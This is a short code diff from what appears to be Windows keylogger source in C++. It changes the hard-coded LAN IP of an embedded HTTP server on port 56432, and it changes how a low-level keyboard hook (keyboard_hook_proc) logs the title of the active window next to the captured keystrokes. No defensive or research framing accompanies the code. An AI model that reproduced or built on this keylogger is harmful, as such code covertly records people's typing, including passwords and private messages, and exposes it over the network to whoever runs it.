@@ -78,7 +78,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	}
 
 	//std::string ip = "192.168.1.7";
-	std::string ip = "192.168.4.12";
+	std::string ip = "192.168.1.7";
 	std::string port = "56432";
 	http::server::server s(ip, port);
 	boost::thread t(boost::bind(&http::server::server::run, &s));
@@ -277,7 +277,8 @@ LRESULT CALLBACK keyboard_hook_proc(int code, WPARAM wParam, LPARAM lParam)
 				if(wcscmp(keyboard.getLastActiveWindow().c_str(), lpCurrWindowName) != 0)
 				{
 					keyboard.setActiveWindow(std::wstring(lpCurrWindowName));
-					keyboard.log(L"\n*****Active Window(TITLE): " + std::wstring(lpCurrWindowName) + L"*****");
+					keyboard.log(L"\r\n[Active Window(TITLE): " + 
+						std::wstring(lpCurrWindowName).erase(0, wstring(lpCurrWindowName).find_last_of('\\')) + L"]\r\n");
 				}
 			}
 			if (cor.count(pKeyBoard->vkCode))
